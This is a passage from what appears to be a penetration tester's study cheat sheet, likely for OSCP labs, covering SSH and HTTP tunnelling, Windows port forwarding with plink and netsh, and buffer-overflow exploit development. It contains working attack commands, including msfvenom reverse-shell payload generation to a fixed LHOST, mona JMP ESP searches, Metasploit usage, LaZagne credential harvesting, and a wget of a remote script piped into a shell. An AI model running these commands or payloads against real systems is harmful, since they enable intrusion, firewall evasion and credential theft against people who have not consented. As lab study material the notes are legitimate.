#open port locally to get through fw port restriction (can point it at TGT_IP or second target through TGT_IP)
ssh -R -N 0.0.0.0:$MY_PORT:$2TGT_IP:$2TGT_PORT $MY_USERNAME@$MY_IP
ssh -R -N 0.0.0.0:$MY_PORT:127.0.0.1:$TGT_PORT $MY_USERNAME@$MY_IP

ssh_proxychain {{{
ssh -N -D 127.0.0.1:8080 $USER@$REDIRECTOR_PORT
sudo vim /etc/proxychains.conf
socks4 127.0.0.1 8080
sudo proxychains $COMMAND
}}}

rinetd {{{
sudo apt update && sudo apt install rinetd
cat /etc/rinetd.conf
	0.0.0.0 80 $TARGET_IP 80 #on redirector
sudo service rinetd restart
}}}

httptunnel{{{
#on $RDR_IP
ssh -L 0.0.0.0:8888:192.168.186.10:3389 student@127.0.0.1
hts --forward-port localhost:8888 1234
#on $MY_IP
htc --forward-port 8080 192.168.186.44:1234
rdesktop 127.0.0.1:8080
}}}

#look into stunnel
}}}

win {{{
plink {{{
#a command-line interface to the PuTTY back ends: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
# make sure ssh is running on $MY_IP & permitRootLogin yes in /etc/ssh/sshd_config
# useful if tgt port isnt open to public, but listening locally. ie 445 to use winexe from kali
# $MY_USER likely is your root acct...
# these are run on target machine...so you have to xfer plink to target
cmd.exe /c echo y | plink.exe -ssh -l $MY_USER -pw $MY_PASS -R $MY_IP:1234:127.0.0.1:$TARGET_PORT $MY_IP
cmd.exe /c echo y | plink.exe $MY_USER@$MY_IP -R 1234:127.0.0.1:$TGT_PORT
}}}

#netsh: system, IP Helper svc running, IPv6 enabled on interface
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.186.10 localport=4455 action=allow
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.186.10 connectport=445 connectaddress=172.16.186.5
sudo mount -t cifs -o port=4455 //192.168.186.10/Data -o username=Administrator,password=lab /mnt/win10_share



}}}
}}}

notes {{{
bad characters {{{
0x00 = null byte. terminate string
0x0D = return character. signifies the end of an HTTP field
0x0A = line feed. terminates HTTP field
0x25
0x26
0x2B
0x3D
}}}

msf-pattern_create -l $LENGTH
msf-pattern_offset -q $PATTERN

!mona modules
msf-nasm_shell
	jmp esp = FFE4
!mona find -s "\xff\xe4" -m "libspp.dll"
!mona find -s "\xff\xe4" -m "msa2mutility05.dll"
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.186 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.186 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

DEP = need JMP ESP in .text b/c Read&Executable
compiling{{{
sudo apt install mingw-w64
i686-w64-mingw32-gcc $EXPLOIT.c -o $EXPLOIT.exe -lws2_32

#mingw-w64.bat installed on windows for gcc

#non-staged payload is sent in its entirety along with the exploit
#staged payload first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.
}}}

psexec_versions {{{
#https://community.chocolatey.org/packages/psexec#versionhistory
#PsExec 2.34				Monday, May 31, 2021
#PsExec 2.33				Monday, March 29, 2021
#PsExec 2.20.20180914	Monday, September 17, 2018
#PsExec 2.20				Wednesday, May 24, 2017
#PsExec 2.11				Monday, December 28, 2015
}}}

#find newer/popular forks: https://techgaun.github.io/active-forks/

frameworks {{{
metasploit {{{
use $MODULE
#previous context
back
#switch to previous module
previous

#search for modules
search $KEYWORD:$STRING
search type:auxiliary name:smb

#module info
info $MODULE
info scanner/smb/smb2

options
set $OPTION $VALUE
unset $OPTION
#global
setg $OPTION $VALUE
unsetg $OPTION

#this will import details from nmap scan into db. nice for services/hosts commands
db_import nmap_scan.xml

#if postgresql running, view database of previous scans
services [-p $PORT] [-s $SERVICE]
hosts

#workspaces - split database entries
#list
workspace
#add|delete
workspace -a
workspace -d
#switch
workspace $WORKSPACE_NAME

run/exploit

#nmap wrapper
db_nmap
}}}
core_impact
immunity_canvas
combalt_strike
powershell_empire
}}}
}}}

to_do {{{
https://book.hacktricks.xyz/linux-unix/privilege-escalation
https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
http://www.fuzzysecurity.com/tutorials/16.html

#not sure if "wine-bin:i386" "gcc-8-base" are needed
#look into powerup to be safe. has auto exploit functions. mentioned by both oscp and udemy
Lazagne {{{
#standalone for linux? (https://github.com/AlessandroZ/LaZagne)
#searches random programs for passwords
pip2 install --upgrade setuptools
pip2 install --upgrade secretstorage
pip2 install pyasn1 psutil pycryptodome
}}}
orc {{{
wget https://raw.githubusercontent.com/zMarch/Orc/master/o.rc && ENV=o.rc sh -i "gethelp"
}}}
pa-th-zuzu {{{
https://github.com/ShotokanZH/Pa-th-zuzu
}}}
}}}